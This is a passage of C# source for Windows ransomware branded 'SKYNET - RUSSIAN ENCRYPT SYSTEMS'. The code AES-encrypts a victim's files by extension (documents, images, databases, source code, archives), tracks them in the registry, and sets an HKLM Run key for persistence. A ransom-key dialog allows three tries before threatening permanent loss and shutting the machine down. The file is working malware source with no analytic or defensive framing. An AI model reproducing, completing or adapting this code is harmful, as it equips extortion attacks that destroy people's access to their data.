        private void GetFiles_MPG(DirectoryInfo Folder)                                                 // MPG
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, MPG, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_PSD(DirectoryInfo Folder)                                                 // PSD
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, PSD, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_SQLITE3(DirectoryInfo Folder)                                                 // SQLITE3
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, SQLITE3, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_SQLITEDB(DirectoryInfo Folder)                                                 // SQLITEDB
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, SQLITEDB, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_SQL(DirectoryInfo Folder)                                                 // SQL
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, SQL, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_CPP(DirectoryInfo Folder)                                                 // CPP
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, CPP, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_ASM(DirectoryInfo Folder)                                                 // ASM
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, ASM, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_TIFF(DirectoryInfo Folder)                                                 // TIFF
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, TIFF, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_TIF(DirectoryInfo Folder)                                                 // TIF
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, TIF, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_GIF(DirectoryInfo Folder)                                                 // GIF
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, GIF, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_PDF(DirectoryInfo Folder)                                                 // PDF
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, PDF, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_CS(DirectoryInfo Folder)                                                 // CS
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, CS, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_BMP(DirectoryInfo Folder)                                                 // BMP
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, BMP, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_ZIP(DirectoryInfo Folder)                                                 // ZIP
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, ZIP, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_RAR(DirectoryInfo Folder)                                                 // RAR
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, RAR, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_7Z(DirectoryInfo Folder)                                                 // 7Z
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, S7Z, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_GO(DirectoryInfo Folder)                                                 // GO
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, GO, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void Autoloader()
        {
            string StartPath = Application.StartupPath+"\\SKYNET.exe";
            var Autoloader = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
            string[] AllNamesValues = Autoloader.GetValueNames(); 
            for (int vvI = 0; vvI < AllNamesValues.Length; vvI++)
            {
                if (AllNamesValues[vvI] == "SKYNET")
                {
                    return;
                }
            }
            Autoloader.SetValue("SKYNET", StartPath);
        }

        private void DeleteAutoloader()
        {
            var DelAutoloadEXE = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
            DelAutoloadEXE.DeleteValue("SKYNET");
            ;
        }

        /*-----------------------------------------------------------SEARCH, DECRYPT AND PROTECT------------------------------------------*/

        private void button1_Click(object sender, EventArgs e)
        {
            string PasswordIn = textBox1.Text;
            string PasswordInHash = "";
            MD5 Hasher = MD5.Create();
            StringBuilder SBuilder = new StringBuilder();

            byte[] ByteHash = Hasher.ComputeHash(Encoding.Default.GetBytes(PasswordIn));
            for (int vvI = 0; vvI < ByteHash.Length; vvI++)
            {
                SBuilder.Append(ByteHash[vvI].ToString("x2"));
            }
            SBuilder.ToString();
            PasswordInHash = Convert.ToString(SBuilder);

            string Password = Properties.Resources.PasswordHash;

            if (PasswordInHash == Password)
            {
                Accept.Play();
                MessageBox.Show("Key accepted. Please, wait for the message about the end of decrypting your files.", "Key accepted");
                try
                {
                    RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way", true);

                    string[] AllWays = Way.GetValueNames();
                    for (int vvI = 0; vvI < AllWays.Length; vvI++)
                    {
                        string NameFile = AllWays[vvI];
                        string WayFile = Way.GetValue(NameFile).ToString();
                        try
                        {
                            AES_Decrypt(WayFile, NameFile, passwordBytes1);
                            Way.DeleteValue(NameFile);
                        }
                        catch (Exception)
                        { }
                    }
                    Way.Close();
                }
                catch(Exception)
                {}
                try
                {
                    Registry.CurrentUser.DeleteSubKey("Way");
                }
                catch(Exception)
                {}
                /*-----------------------------------------------------------CANCEL REGISTRY CHANGES WITHOUT WALLPAPER------------------------------------------*/

                Microsoft.Win32.RegistryKey RegKeyDel = Microsoft.Win32.Registry.CurrentUser;      // ON TASK MANAGER IN REGYSTRY 
                try
                {
                    RegKeyDel.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    RegKeyDel.Close();
                }
                catch { }
            }
            else
            {
                CHECK_KEY--;
                if (CHECK_KEY == 2)
                {
                    Error.Play();
                    MessageBox.Show("You entered an INVALID key, you have 2 more attempts!", "Invalid key");
                    goto RETURN;
                }
                if (CHECK_KEY == 1)
                {
                    Error.Play();
                    MessageBox.Show("You again entered an INVALID key, you have 1 more attempt!", "Invalid key");
                    goto RETURN;
                }
                if (CHECK_KEY == 0)
                {
                    string SystemDrive = System.IO.Path.GetPathRoot(WindowsDirectory());
                    string Systemfolder = SystemDrive+"System";
                    System.IO.Directory.CreateDirectory(Systemfolder);
                    FileStream Check = new FileStream(Systemfolder + "\\SystemComponentsAutorun.txt", FileMode.OpenOrCreate);
                    StreamWriter CH = new StreamWriter(Check);
                    CH.WriteLine("You have not chances.");
                    CH.Close();
                    Error.Play();
                    MessageBox.Show("You AGAIN entered an INVALID KEY and LOST the LAST attempt to RECOVER your FILES.\nGood luck.\n\n\t\t    SKYNET - RUSSIAN ENCRYPT SYSTEMS", "Invalid key");
                    SHUTDOWN2();
                }
            }
            try
            {
                DeleteAutoloader();
            }
            catch(Exception)
            { }
            Accept.Play();
            MessageBox.Show("Your files has been decrypted.\nGood luck and be more careful.\n\n     SKYNET - RUSSIAN ENCRYPT SYSTEMS", "");
            SHUTDOWN2();

        RETURN:;
        }
    }
}
